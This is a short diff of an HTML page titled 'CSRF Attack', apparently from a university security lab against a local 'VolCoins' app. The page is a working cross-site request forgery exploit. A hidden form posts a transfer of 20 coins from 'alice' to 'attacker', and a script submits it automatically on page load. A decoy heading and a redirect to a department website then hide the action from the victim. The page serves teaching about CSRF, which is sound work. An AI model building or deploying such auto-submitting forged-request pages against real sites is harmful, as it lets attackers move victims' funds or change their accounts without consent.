@@ -4,25 +4,24 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF</title>
+    <title>CSRF Attack</title>
 </head>
 <body>
-    <h1>Click the button to transfer 20 VolCoins to the attacker's account</h1>
+    <h1>Transfer VolCoins</h1>
+    <p>You currently have 1100 volCoins.</p>
     <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
         <input type="hidden" name="from" value="alice">
         <input type="hidden" name="to" value="attacker">
         <input type="hidden" name="amount" value="20">
-        <input type="hidden" name="_method" value="PUT"> <!-- Add this line -->
-        <input type="submit" value="Transfer VolCoins" style="display:none;"> <!-- Hide the submit button -->
+        <input type="submit" value="Transfer">
     </form>
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            document.getElementById("csrfForm").submit(); // Submit the form
-            setTimeout(function(){
-                window.location.href = "https://eecs.utk.edu/";
-            }, 1000); // Redirect after 1 second
-        });
+        document.getElementById("csrfForm").submit();
+        setTimeout(function(){
+            window.location.href = "https://eecs.utk.edu/";
+        }, 1000); // Redirect after 1 second
     </script>
 </body>
 </html>
+
 
